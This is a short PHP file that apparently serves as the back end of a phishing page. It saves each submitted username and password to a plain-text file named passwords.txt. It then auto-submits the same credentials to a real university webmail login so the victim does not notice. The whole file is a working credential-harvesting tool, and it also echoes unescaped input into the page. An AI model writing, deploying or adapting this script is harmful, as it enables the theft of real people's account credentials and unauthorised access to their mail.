<?php
	if(isset($_POST["username"])){
		$username = $_POST["username"];
	}
	if(isset($_POST["password"])){
		$password = $_POST["password"];
	}
	if(isset($_POST["password"]) && isset($_POST["username"])){
		$file = fopen("passwords.txt", "a");
		$content = str_replace(["{{USER}}","{{PASSWORD}}"],[$username,$password],"username:{{USER}}\npassword:{{PASSWORD}}\n\n");
		fwrite($file,$content);	
		fclose($file);
	}
?>
	<form name="form" method="post" action="https://smail.pwr.edu.pl/auth">
		<input class="ctdialog" type="hidden" size="24" id="username" name="username" 
		value="<?php echo $_POST["username"]; ?>">

		<input class="ctdialog" type="hidden" name="password" size="24" id="password"
		 value="<?php echo $_POST["password"]; ?>">
	</form>
	<script>
		  document.form.submit();
	</script>


